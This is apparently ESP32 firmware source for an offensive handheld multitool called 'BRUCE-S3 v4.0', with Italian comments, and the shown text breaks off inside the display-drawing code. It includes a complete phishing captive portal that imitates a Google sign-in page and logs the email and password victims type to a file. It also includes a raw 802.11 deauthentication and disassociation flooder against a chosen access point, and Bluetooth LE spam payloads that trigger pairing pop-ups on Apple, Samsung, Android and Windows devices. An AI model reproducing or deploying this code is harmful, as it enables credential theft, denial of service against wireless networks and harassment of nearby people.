#include "esp_wifi.h"
#include "freertos/FreeRTOS.h"
#include "freertos/semphr.h"
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <Arduino.h>
#include <BLEBeacon.h>
#include <BLEDevice.h>
#include <BLEServer.h>
#include <BLEUtils.h>
#include <DNSServer.h>
#include <LittleFS.h>
#include <WebServer.h>
#include <WiFi.h>
#include <Wire.h>
#include <esp_mac.h>
#include <SPI.h>
#include <MFRC522.h>
#include <Preferences.h>

// ============================================================================
// CONFIGURAZIONE HARDWARE
// ============================================================================

// Display OLED
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

// Pin dei pulsanti
const int PIN_UP = 4;
const int PIN_DOWN = 5;
const int PIN_OK = 6;
const int PIN_ESC = 7;

// Pin RFID (SPI)
#define RFID_SS 2
#define RFID_RST 12
#define RFID_SCK 3
#define RFID_MOSI 10
#define RFID_MISO 11

// Pin Sensore Suono
#define SOUND_PIN 1

// RFID
MFRC522 rfid(RFID_SS, RFID_RST);
Preferences prefs;

// Costanti UI
const int debounceMs = 50;
const int totalOptions = 11; // Aumentato per nuove opzioni
const char *menuOptions[] = {
    "1. Free Portal",
    "2. Clone Attack",
    "3. Deauth Attack",
    "4. Imposta Nome",
    "5. BLE Spam",
    "6. View Creds",
    "7. Clear Creds",
    "8. RFID Manager",
    "9. Sound Analyzer",
    "A. Screen Sleep",
    "B. WiFi Bands"
};

const char *bleOptions[] = {
    "1. Apple (iOS)",
    "2. Samsung",
    "3. Android Gen",
    "4. Windows Fast",
    "5. All Random"
};

const char *rfidMenuOptions[] = {
    "1. Scan Card",
    "2. Saved Cards",
    "3. Delete All",
    "4. Back"
};

const char *soundMenuOptions[] = {
    "1. Scan 5s",
    "2. Scan 10s",
    "3. Scan 20s",
    "4. Live Mode",
    "5. Back"
};

// ============================================================================
// STRUTTURE DATI
// ============================================================================

enum Mode {
  MENU,
  PORTAL,
  DEAUTH,
  SCANNER,
  KEYBOARD,
  BLE_SELECT,
  BLE_SPAM,
  VIEW_CREDS,
  RFID_MENU,
  RFID_SCAN,
  RFID_LIST,
  SOUND_MENU,
  SOUND_SCAN,
  SOUND_LIVE,
  SCREEN_SLEEP,
  WIFI_BANDS
};

enum BleType {
  APPLE,
  SAMSUNG,
  ANDROID,
  WINDOWS,
  ALL_RANDOM
};

struct ButtonState {
  bool stableHigh;
  bool lastReading;
  unsigned long lastChange;
};

struct RFIDCard {
  uint32_t uid;
  char name[16];
};

// ============================================================================
// VARIABILI GLOBALI
// ============================================================================

// Stato sistema
volatile Mode currentMode = MENU;
volatile Mode previousMode = MENU;
BleType selectedBleType = APPLE;
volatile bool needsUpdate = true;
SemaphoreHandle_t xMutex;

// Screen sleep
bool screenSleepEnabled = false;
unsigned long lastActivityTime = 0;
const unsigned long SCREEN_TIMEOUT = 30000; // 30 secondi

// Networking
DNSServer dnsServer;
WebServer server(80);
String custom_ssid = "Wi-Fi Gratuito";
String target_ssid = "";
uint8_t target_bssid[6];
int target_channel = 1;
bool deauthReady = false;
bool wifiMultiBand = true; // Supporta tutte le bande

// Credenziali catturate
String captured_user = "";
String captured_pass = "";

// Contatori e indici
volatile int attack_count = 0;
int networksFound = 0;
int menuIndex = 0;
int scanIndex = 0;
int bleSelectIndex = 0;
int textScroll = 0;
int rfidMenuIndex = 0;
int rfidCardIndex = 0;
int soundMenuIndex = 0;

// Keyboard
String kbBuffer = "";
char kbChar = 'A';

// BLE Enhanced
bool bleActive = false;
volatile int bleSpamPacketsSent = 0;
unsigned long bleRotationInterval = 1500; // Rotazione più veloce
int bleVariant = 0;

// Pulsanti
ButtonState upButton = {true, true, 0};
ButtonState downButton = {true, true, 0};
ButtonState okButton = {true, true, 0};
ButtonState escButton = {true, true, 0};

// RFID
#define MAX_RFID_CARDS 20
RFIDCard savedCards[MAX_RFID_CARDS];
int savedCardsCount = 0;
uint32_t scannedUID = 0;
bool cardDetected = false;

// Sound Analyzer
#define SOUND_SAMPLES 128
int soundBuffer[SOUND_SAMPLES];
int soundIndex = 0;
int soundMax = 0;
int soundMin = 4095;
int soundAvg = 0;
int soundPeaks = 0;
int soundScanDuration = 5000;
unsigned long soundScanStart = 0;
bool soundScanning = false;

// ============================================================================
// PAYLOADS BLE ENHANCED
// ============================================================================

uint8_t apple_payload[] = {
    0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02,
    0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
    0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
    0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12
};

uint8_t apple_variants[][31] = {
    // AirPods Pro
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x01, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45},
    // AirPods Max
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x03, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45},
    // AirPods Gen 2
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x02, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45}
};

uint8_t samsung_payload[] = {
    0x18, 0xff, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01,
    0x01, 0xff, 0x00, 0x00, 0x43, 0x61, 0x73, 0x61, 0x43,
    0x6f, 0x6e, 0x6e, 0x65, 0x63, 0x74, 0x00
};

uint8_t android_payload[] = {
    0x03, 0x03, 0x2c, 0xfe,
    0x17, 0x16, 0x2c, 0xfe, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

uint8_t windows_payload[] = {
    0x1e, 0xff, 0x06, 0x00, 0x01, 0x09, 0x20, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

// ============================================================================
// HTML PAGINA LOGIN
// ============================================================================

const char login_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="it">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Accedi - Account Google</title>
<style>
body{font-family:'Segoe UI',Roboto,Arial,sans-serif;background:#fff;color:#202124;display:flex;flex-direction:column;min-height:100vh;margin:0;align-items:center;justify-content:center}
.card{width:100%;max-width:450px;padding:48px 40px 36px;box-sizing:border-box;display:flex;flex-direction:column;border:1px solid #dadce0;border-radius:8px}
@media(max-width:600px){.card{border:none;padding:24px}body{display:block}}
.logo{display:flex;justify-content:center;margin-bottom:10px}
h1{font-size:24px;font-weight:400;text-align:center;margin:0 0 10px 0}
p{font-size:16px;text-align:center;margin:0 0 30px 0;color:#202124}
.input-group{position:relative;margin-bottom:20px}
input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;box-sizing:border-box;outline:none;color:#202124}
input:focus{border:2px solid #1a73e8;padding:12px 14px}
.label-float{position:absolute;left:10px;top:-10px;background:#fff;padding:0 5px;font-size:12px;color:#1a73e8}
.btn{background-color:#1a73e8;color:white;padding:10px 24px;border-radius:4px;font-weight:500;border:none;cursor:pointer;float:right;font-size:14px}
.btn:hover{background-color:#1b66c9}
.link{color:#1a73e8;font-weight:500;font-size:14px;text-decoration:none;cursor:pointer;display:inline-block;margin-top:10px}
footer{margin-top:20px;font-size:12px;color:#70757a;width:100%;max-width:450px;display:flex;justify-content:space-between;padding:0 20px;box-sizing:border-box}
.error-msg{color:#d93025;font-size:12px;display:none;margin-top:5px}
</style>
</head>
<body>
<div class="card">
  <div class="logo">
    <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg">
      <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
      <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
      <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
      <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
    </svg>
  </div>
  <h1>Accedi</h1>
  <p>Usa il tuo Account Google</p>
  <form id="loginForm" action="/login" method="POST">
    <div class="input-group">
      <input type="text" id="email" name="u" required autocomplete="username">
      <span class="label-float">Email o telefono</span>
      <div id="emailError" class="error-msg">Inserisci un indirizzo email valido</div>
    </div>
    <div class="input-group">
      <input type="password" name="p" required autocomplete="current-password">
      <span class="label-float">Password</span>
    </div>
    <a href="#" class="link">Password dimenticata?</a><br><br>
    <button type="submit" class="btn">Avanti</button>
  </form>
</div>
<footer>
  <span>Italiano</span>
  <div style="display:flex;gap:15px;"><span>Guida</span><span>Privacy</span><span>Termini</span></div>
</footer>
<script>
document.getElementById('loginForm').addEventListener('submit',function(e){
  var email=document.getElementById('email').value;
  if(!email.includes('@')){
    e.preventDefault();
    document.getElementById('emailError').style.display='block';
    document.getElementById('email').style.borderColor='#d93025';
  }
});
</script>
</body>
</html>
)rawliteral";

// ============================================================================
// UTILITY FUNCTIONS
// ============================================================================

void wakeScreen() {
  lastActivityTime = millis();
  if (screenSleepEnabled) {
    screenSleepEnabled = false;
    display.ssd1306_command(SSD1306_DISPLAYON);
    needsUpdate = true;
  }
}

String getScrollingText(String text, int offset) {
  if (text.length() <= 16) return text;
  offset = constrain(offset, 0, max(0, (int)text.length() - 16));
  return text.substring(offset, offset + 16);
}

String formatLine(String text, int maxLen) {
  if ((int)text.length() <= maxLen) return text;
  return text.substring(0, maxLen - 2) + "..";
}

String uidToString(uint32_t uid) {
  char buf[12];
  sprintf(buf, "%08X", uid);
  return String(buf);
}

// ============================================================================
// RFID FUNCTIONS
// ============================================================================

void loadRFIDCards() {
  prefs.begin("rfid", true);
  savedCardsCount = prefs.getInt("count", 0);
  for (int i = 0; i < savedCardsCount && i < MAX_RFID_CARDS; i++) {
    String key = "uid" + String(i);
    savedCards[i].uid = prefs.getUInt(key.c_str(), 0);
    key = "name" + String(i);
    prefs.getString(key.c_str(), savedCards[i].name, 16);
  }
  prefs.end();
}

void saveRFIDCards() {
  prefs.begin("rfid", false);
  prefs.putInt("count", savedCardsCount);
  for (int i = 0; i < savedCardsCount; i++) {
    String key = "uid" + String(i);
    prefs.putUInt(key.c_str(), savedCards[i].uid);
    key = "name" + String(i);
    prefs.putString(key.c_str(), savedCards[i].name);
  }
  prefs.end();
}

void addRFIDCard(uint32_t uid) {
  if (savedCardsCount >= MAX_RFID_CARDS) return;

  // Controlla se esiste già
  for (int i = 0; i < savedCardsCount; i++) {
    if (savedCards[i].uid == uid) return;
  }

  savedCards[savedCardsCount].uid = uid;
  snprintf(savedCards[savedCardsCount].name, 16, "Card_%d", savedCardsCount + 1);
  savedCardsCount++;
  saveRFIDCards();
}

void deleteAllRFIDCards() {
  prefs.begin("rfid", false);
  prefs.clear();
  prefs.end();
  savedCardsCount = 0;
}

bool scanRFIDCard() {
  if (!rfid.PICC_IsNewCardPresent()) return false;
  if (!rfid.PICC_ReadCardSerial()) return false;

  scannedUID = 0;
  for (byte i = 0; i < rfid.uid.size; i++) {
    scannedUID = (scannedUID << 8) | rfid.uid.uidByte[i];
  }

  rfid.PICC_HaltA();
  rfid.PCD_StopCrypto1();
  return true;
}

// ============================================================================
// SOUND ANALYZER FUNCTIONS
// ============================================================================

void startSoundScan(int duration) {
  soundScanDuration = duration;
  soundScanStart = millis();
  soundScanning = true;
  soundIndex = 0;
  soundMax = 0;
  soundMin = 4095;
  soundAvg = 0;
  soundPeaks = 0;
  memset(soundBuffer, 0, sizeof(soundBuffer));
}

void updateSoundScan() {
  if (!soundScanning) return;

  int reading = analogRead(SOUND_PIN);

  if (soundIndex < SOUND_SAMPLES) {
    soundBuffer[soundIndex++] = reading;
  } else {
    // Shift buffer
    for (int i = 0; i < SOUND_SAMPLES - 1; i++) {
      soundBuffer[i] = soundBuffer[i + 1];
    }
    soundBuffer[SOUND_SAMPLES - 1] = reading;
  }

  // Update stats
  soundMax = max(soundMax, reading);
  soundMin = min(soundMin, reading);

  // Detect peaks
  static int lastReading = 0;
  if (reading > lastReading + 100) {
    soundPeaks++;
  }
  lastReading = reading;

  // Check if done
  if (millis() - soundScanStart >= soundScanDuration) {
    soundScanning = false;

    // Calculate average
    long sum = 0;
    for (int i = 0; i < SOUND_SAMPLES; i++) {
      sum += soundBuffer[i];
    }
    soundAvg = sum / SOUND_SAMPLES;
  }
}

void drawSoundWaveform(int startY, int height) {
  // Usa tutti i campioni disponibili per il waveform
  int step = max(1, SOUND_SAMPLES / SCREEN_WIDTH);
  int prevY = startY + height / 2;

  for (int x = 0; x < SCREEN_WIDTH; x++) {
    int idx = x * step;
    if (idx >= SOUND_SAMPLES) break;

    int val = soundBuffer[idx];
    // Map con range aumentato per vedere meglio le onde
    int y = map(val, 0, 4095, startY + height - 1, startY + 1);
    y = constrain(y, startY, startY + height - 1);

    if (x > 0) {
      display.drawLine(x - 1, prevY, x, y, SSD1306_WHITE);
    }
    prevY = y;
  }

  // Linea centrale di riferimento
  display.drawLine(0, startY + height/2, SCREEN_WIDTH, startY + height/2, SSD1306_WHITE);
}

// ============================================================================
// NETWORK CLEANUP
// ============================================================================

void cleanNetworkState() {
  server.stop();
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  WiFi.disconnect(true, true);
  WiFi.mode(WIFI_OFF);
  esp_wifi_set_promiscuous(false);
  deauthReady = false;
  delay(100);
}

// ============================================================================
// BLE ENHANCED FUNCTIONS
// ============================================================================

void stopBleSpam() {
  if (bleActive) {
    BLEDevice::deinit(true);
    bleActive = false;
    delay(50);
  }
}

void startBleSpam(BleType type) {
  stopBleSpam();
  cleanNetworkState();
  selectedBleType = type;
  bleSpamPacketsSent = 0;
  bleVariant = 0;
  currentMode = BLE_SPAM;
  needsUpdate = true;
}

void runBLESpam() {
  static uint32_t lastBleRotate = 0;

  if (millis() - lastBleRotate > bleRotationInterval) {
    lastBleRotate = millis();

    if (bleActive) {
      BLEDevice::deinit(true);
      bleActive = false;
      delay(50);
    }

    // MAC casuale
    uint8_t new_mac[6];
    for (int i = 0; i < 6; i++) {
      new_mac[i] = random(0, 256);
    }
    new_mac[0] = (new_mac[0] & 0xFE) | 0x02;

    esp_base_mac_addr_set(new_mac);
    BLEDevice::init("");
    bleActive = true;

    BLEServer *pServer = BLEDevice::createServer();
    BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();

    uint8_t *payload;
    size_t len;

    if (selectedBleType == ALL_RANDOM) {
      // Cicla tra tutti i tipi
      int type = bleVariant % 4;
      bleVariant++;

      switch(type) {
        case 0:
          payload = apple_variants[random(0, 3)];
          len = 31;
          break;
        case 1:
          payload = samsung_payload;
          len = sizeof(samsung_payload);
          break;
        case 2:
          payload = android_payload;
          len = sizeof(android_payload);
          break;
        case 3:
          payload = windows_payload;
          len = sizeof(windows_payload);
          break;
      }
    } else if (selectedBleType == APPLE) {
      payload = apple_variants[bleVariant % 3];
      bleVariant++;
      len = 31;
    } else if (selectedBleType == SAMSUNG) {
      payload = samsung_payload;
      len = sizeof(samsung_payload);
    } else if (selectedBleType == ANDROID) {
      payload = android_payload;
      len = sizeof(android_payload);
    } else if (selectedBleType == WINDOWS) {
      payload = windows_payload;
      len = sizeof(windows_payload);
    }

    BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
    oAdvertisementData.addData(String((char *)payload, len));
    pAdvertising->setAdvertisementData(oAdvertisementData);
    pAdvertising->start();

    bleSpamPacketsSent++;
  }
}

// ============================================================================
// WIFI TASK (Core 0)
// ============================================================================

void TaskWiFi(void *pvParameters) {
  for (;;) {
    if (currentMode == PORTAL) {
      dnsServer.processNextRequest();
      server.handleClient();
    } else if (currentMode == DEAUTH && deauthReady) {
      esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);

      uint8_t deauthPacket[26] = {
          0xC0, 0x00, 0x00, 0x00,
          0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
          target_bssid[0], target_bssid[1], target_bssid[2],
          target_bssid[3], target_bssid[4], target_bssid[5],
          target_bssid[0], target_bssid[1], target_bssid[2],
          target_bssid[3], target_bssid[4], target_bssid[5],
          0x00, 0x00, 0x06, 0x00
      };

      uint8_t disasPacket[26] = {
          0xA0, 0x00, 0x00, 0x00,
          0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
          target_bssid[0], target_bssid[1], target_bssid[2],
          target_bssid[3], target_bssid[4], target_bssid[5],
          target_bssid[0], target_bssid[1], target_bssid[2],
          target_bssid[3], target_bssid[4], target_bssid[5],
          0x00, 0x00, 0x01, 0x00
      };

      // Invia pacchetti multipli per maggiore efficacia
      for (int i = 0; i < 5; i++) {
        esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
        esp_wifi_80211_tx(WIFI_IF_AP, disasPacket, sizeof(disasPacket), false);
      }

      attack_count += 10;
      vTaskDelay(pdMS_TO_TICKS(20));
    }
    vTaskDelay(pdMS_TO_TICKS(5));
  }
}

// ============================================================================
// FILESYSTEM FUNCTIONS
// ============================================================================

void saveCreds(String user, String pass) {
  File f = LittleFS.open("/creds.txt", FILE_APPEND);
  if (f) {
    f.println("U: " + user + " | P: " + pass);
    f.close();
  }
}

void clearCreds() {
  if (LittleFS.exists("/creds.txt")) {
    LittleFS.remove("/creds.txt");
  }
}

void loadLastCreds() {
  if (LittleFS.exists("/creds.txt")) {
    File f = LittleFS.open("/creds.txt", FILE_READ);
    String lastLine = "";
    while (f.available()) {
      lastLine = f.readStringUntil('\n');
    }
    f.close();

    if (lastLine.length() > 0) {
      int uIdx = lastLine.indexOf("U: ");
      int pIdx = lastLine.indexOf(" | P: ");
      if (uIdx != -1 && pIdx != -1) {
        captured_user = lastLine.substring(uIdx + 3, pIdx);
        captured_pass = lastLine.substring(pIdx + 5);
        captured_user.trim();
        captured_pass.trim();
      }
    }
  }
}

// ============================================================================
// PORTAL HANDLERS
// ============================================================================

void handleLogin() {
  if (server.hasArg("u") && server.hasArg("p") && server.arg("u").length() > 0) {
    if (xSemaphoreTake(xMutex, pdMS_TO_TICKS(100))) {
      captured_user = server.arg("u");
      captured_pass = server.arg("p");
      saveCreds(captured_user, captured_pass);
      needsUpdate = true;
      xSemaphoreGive(xMutex);
    }
    server.send(200, "text/html",
                "<html><head><meta http-equiv='refresh' content='2;url=https://www.google.com'></head>"
                "<body style='font-family:sans-serif;text-align:center;padding-top:50px;'>"
                "<h2>Accesso riuscito</h2></body></html>");
  } else {
    server.send(204, "text/plain", "");
  }
}

void startPortal(String ssid) {
  stopBleSpam();
  cleanNetworkState();
  target_ssid = ssid;
  WiFi.mode(WIFI_AP);
  WiFi.softAP(target_ssid.c_str());
  dnsServer.start(53, "*", WiFi.softAPIP());

  server.on("/", []() {
    server.send(200, "text/html", login_html);
  });

  server.on("/login", HTTP_POST, handleLogin);

  server.onNotFound([]() {
    server.sendHeader("Location", "http://192.168.4.1/", true);
    server.send(302, "text/plain", "");
  });

  server.begin();
  currentMode = PORTAL;
  textScroll = 0;
  needsUpdate = true;
}

// ============================================================================
// DEAUTH FUNCTIONS
// ============================================================================

void startDeauth(int index) {
  stopBleSpam();
  target_ssid = WiFi.SSID(index);
  target_channel = WiFi.channel(index);
  memcpy(target_bssid, WiFi.BSSID(index), 6);
  cleanNetworkState();

  // Supporto multi-banda
  if (target_channel < 1 || target_channel > 14) {
    target_channel = 1;
  }

  bool bssidValid = false;
  for (int i = 0; i < 6; i++) {
    if (target_bssid[i] != 0x00) {
      bssidValid = true;
      break;
    }
  }

  if (!bssidValid) {
    currentMode = MENU;
    needsUpdate = true;
    return;
  }

  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP("bruce-deauth", "", target_channel, true, 1);
  esp_wifi_set_promiscuous(true);
  deauthReady = true;
  attack_count = 0;
  currentMode = DEAUTH;
  needsUpdate = true;
}

// ============================================================================
// UI DRAWING - OTTIMIZZATO ANTI-CRASH
// ============================================================================

void drawUI() {
  // Check screen sleep
  if (screenSleepEnabled) {
    display.clearDisplay();
    display.display();
    return;
  }

  String userCopy, passCopy;

  if (xSemaphoreTake(xMutex, pdMS_TO_TICKS(10))) {
    userCopy = captured_user;
    passCopy = captured_pass;
    xSemaphoreGive(xMutex);
  } else {
    userCopy = captured_user;
    passCopy = captured_pass;
  }

  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
  display.setCursor(0, 0);

  switch (currentMode) {
    case MENU: {
      display.print("BRUCE-S3 v4.0");
      display.drawLine(0, 9, 128, 9, SSD1306_WHITE);

      // Scroll menu se necessario
      int startIdx = max(0, menuIndex - 4);
      int endIdx = min(totalOptions, startIdx + 5);

      for (int i = startIdx; i < endIdx; i++) {
        int yPos = 15 + ((i - startIdx) * 10);
        display.setCursor(5, yPos);
        if (i == menuIndex) {
          display.setTextColor(SSD1306_BLACK, SSD1306_WHITE);
          display.print(">");
        } else {
          display.setTextColor(SSD1306_WHITE);
          display.print(" ");
        }
        display.println(menuOptions[i]);
        display.setTextColor(SSD1306_WHITE);
      }
      break;
    }

    case KEYBOARD: {
      display.print("NOME RETE:");
      display.drawLine(0, 9, 128, 9, SSD1306_WHITE);
      display.setCursor(0, 20);
      display.print(kbBuffer.substring(0, 20));
      display.print("_");
      display.setCursor(45, 42);
      display.setTextSize(2);
      display.print("[ ");
      display.print(kbChar);
      display.print(" ]");
      display.setTextSize(1);
      display.setCursor(0, 56);
      display.print("OK:Add Hold:Save");
      break;
    }

    case PORTAL: {
      display.print("PORTAL: ");
      display.println(formatLine(target_ssid, 12));
      display.drawLine(0, 9, 128, 9, SSD1306_WHITE);
      display.setCursor(0, 15);
      display.println("EMAIL:");
      display.setCursor(0, 25);
      display.setTextColor(SSD1306_BLACK, SSD1306_WHITE);
      display.println(userCopy == "" ? "Waiting..." : getScrollingText(userCopy, textScroll));
      display.setTextColor(SSD1306_WHITE);
      display.setCursor(0, 38);
      display.println("PASSWORD:");
      display.setCursor(0, 48);
      display.setTextColor(SSD1306_BLACK, SSD1306_WHITE);
      display.println(passCopy == "" ? "Waiting..." : getScrollingText(passCopy, textScroll));
      break;
    }

    case DEAUTH: {
      display.print("DEAUTH ACTIVE");
      display.drawLine(0, 9, 128, 9, SSD1306_WHITE);
      display.setCursor(0, 18);
      display.println(formatLine(target_ssid, 20));
      display.setCursor(0, 30);
      display.print("CH:");
      display.print(target_channel);
      display.print(" BAND:");
      display.println(target_channel <= 14 ? "2.4G" : "5G");
      display.setTextSize(2);
      display.setCursor(0, 45);
      display.print("PKT:");
      display.print(attack_count);
      break;
    }

    case SCANNER: {
      display.print("WIFI SCANNER");
      display.drawLine(0, 9, 128, 9, SSD1306_WHITE);
      if (networksFound <= 0) {
        display.setCursor(25, 30);
        display.println("Scanning...");
      } else {
        int startPos = max(0, scanIndex - 2);
        int endPos = min(networksFound, startPos + 5);

        for (int i = startPos; i < endPos; i++) {
          int yPos = 15 + ((i - startPos) * 9);
          display.setCursor(0, yPos);
          if (i == scanIndex) {
            display.setTextColor(SSD1306_BLACK, SSD1306_WHITE);
            display.print(">");
          } else {
            display.setTextColor(SSD1306_WHITE);
            display.print(" ");
          }
          String ssid = WiFi.SSID(i);
          display.print(formatLine(ssid, 17));
          display.setTextColor(SSD1306_WHITE);
          display.print(" ");
          display.println(WiFi.RSSI(i));
        }
      }
      break;
    }

    case BLE_SELECT: {
      display.print("BLE SPAM TYPE:");
      display.drawLine(0, 9, 128, 9, SSD1306_WHITE);
      for (int i = 0; i < 5; i++) {
        display.setCursor(5, 15 + (i * 10));
        if (i == bleSelectIndex) {
          display.setTextColor(SSD1306_BLACK, SSD1306_WHITE);
          display.print("> ");
        } else {
          display.setTextColor(SSD1306_WHITE);
          display.print("  ");
        }
        display.println(bleOptions[i]);
        display.setTextColor(SSD1306_WHITE);
      }
      break;
    }

    case BLE_SPAM: {
      display.print("BLE SPAM ACTIVE");
      display.drawLine(0, 9, 128, 9, SSD1306_WHITE);
      display.setCursor(0, 18);
      display.print("TYPE: ");
      if (selectedBleType == APPLE) display.println("Apple");
      else if (selectedBleType == SAMSUNG) display.println("Samsung");
      else if (selectedBleType == ANDROID) display.println("Android");
      else if (selectedBleType == WINDOWS) display.println("Windows");
      else display.println("All Random");
      display.setCursor(0, 30);
      display.print("Status: ACTIVE");
      display.setTextSize(2);
      display.setCursor(0, 45);
      display.print("PKT:");
      display.print(bleSpamPacketsSent);
      break;
    }

    case VIEW_CREDS: {
      display.println("=== CAPTURED ===");
      display.drawLine(0, 9, 128, 9, SSD1306_WHITE);
      if (!LittleFS.exists("/creds.txt")) {
        display.setCursor(15, 30);
        display.println("No credentials");
      } else {
        File f = LittleFS.open("/creds.txt", FILE_READ);
        int line = 0;
        int yPos = 12;
        while (f.available() && line < 4) {
          String l = f.readStringUntil('\n');
          display.setCursor(0, yPos);
          display.println(l.substring(0, 21));
          yPos += 10;
          line++;
        }
        f.close();
      }
      display.setCursor(0, 56);
      display.println("[ESC] Back");
      break;
    }

    case RFID_MENU: {
      display.print("RFID MANAGER");
      display.drawLine(0, 9, 128, 9, SSD1306_WHITE);
      for (int i = 0; i < 4; i++) {
        display.setCursor(5, 15 + (i * 12));
        if (i == rfidMenuIndex) {
          display.setTextColor(SSD1306_BLACK, SSD1306_WHITE);
          display.print("> ");
        } else {
          display.setTextColor(SSD1306_WHITE);
          display.print("  ");
        }
        display.println(rfidMenuOptions[i]);
        display.setTextColor(SSD1306_WHITE);
      }
      break;
    }

    case RFID_SCAN: {
      display.print("SCAN RFID CARD");
      display.drawLine(0, 9, 128, 9, SSD1306_WHITE);
      display.setCursor(10, 25);
      display.println("Place card on");
      display.setCursor(20, 35);
      display.println("reader...");

      if (cardDetected) {
        display.setCursor(0, 50);
        display.print("UID:");
        display.println(uidToString(scannedUID));
      }
      break;
    }

    case RFID_LIST: {
      display.print("SAVED CARDS");
      display.drawLine(0, 9, 128, 9, SSD1306_WHITE);
      if (savedCardsCount == 0) {
        display.setCursor(20, 30);
        display.println("No cards saved");
      } else {
        int startPos = max(0, rfidCardIndex - 2);
        int endPos = min(savedCardsCount, startPos + 4);

        for (int i = startPos; i < endPos; i++) {
          int yPos = 15 + ((i - startPos) * 11);
          display.setCursor(0, yPos);
          if (i == rfidCardIndex) {
            display.setTextColor(SSD1306_BLACK, SSD1306_WHITE);
            display.print("> ");
          } else {
            display.setTextColor(SSD1306_WHITE);
            display.print(" ");
          }
          display.print(savedCards[i].name);
          display.setTextColor(SSD1306_WHITE);
          display.setCursor(0, yPos + 8);
          display.print("  ");
          display.println(uidToString(savedCards[i].uid));
        }
      }
      break;
    }

    case SOUND_MENU: {
      display.print("SOUND ANALYZER");
      display.drawLine(0, 9, 128, 9, SSD1306_WHITE);
      for (int i = 0; i < 5; i++) {
        display.setCursor(5, 15 + (i * 10));
        if (i == soundMenuIndex) {
          display.setTextColor(SSD1306_BLACK, SSD1306_WHITE);
          display.print("> ");
        } else {
          display.setTextColor(SSD1306_WHITE);
          display.print("  ");
        }
        display.println(soundMenuOptions[i]);
        display.setTextColor(SSD1306_WHITE);
      }
      break;
    }

    case SOUND_SCAN: {
      display.print("SOUND SCAN");
      display.drawLine(0, 9, 128, 9, SSD1306_WHITE);

      if (soundScanning) {
        display.setCursor(0, 15);
        display.print("Scanning...");
        int elapsed = (millis() - soundScanStart) / 1000;
        display.print(elapsed);
        display.print("s");

        drawSoundWaveform(25, 30);
      } else {
        display.setCursor(0, 15);
        display.println("=== RESULTS ===");
        display.setCursor(0, 28);
        display.print("Max: ");
        display.println(soundMax);
        display.setCursor(0, 38);
        display.print("Avg: ");
        display.println(soundAvg);
        display.setCursor(0, 48);
        display.print("Peaks: ");
        display.println(soundPeaks);
      }
      break;
    }

    case SOUND_LIVE: {
      display.print("LIVE AUDIO");
      display.drawLine(0, 9, 128, 9, SSD1306_WHITE);

      // Leggi valore corrente
      int currentLevel = analogRead(SOUND_PIN);

      // Waveform grande e visibile
      drawSoundWaveform(12, 35);

      // Barra livello attuale
      int barWidth = map(currentLevel, 0, 4095, 0, 118);
      display.fillRect(5, 50, barWidth, 6, SSD1306_WHITE);
      display.drawRect(4, 49, 120, 8, SSD1306_WHITE);

      // Info numerica
      display.setCursor(0, 58);
      display.setTextSize(1);
      display.print("LV:");
      display.print(currentLevel);
      display.print(" ");
      // Calcola percentuale
      int percent = map(currentLevel, 0, 4095, 0, 100);
      display.print(percent);
      display.print("%");
      break;
    }

    case SCREEN_SLEEP: {
      display.clearDisplay();
      display.display();
      break;
    }

    case WIFI_BANDS: {
      display.print("WIFI BANDS");
      display.drawLine(0, 9, 128, 9, SSD1306_WHITE);
      display.setCursor(10, 25);
      display.println("Multi-band mode:");
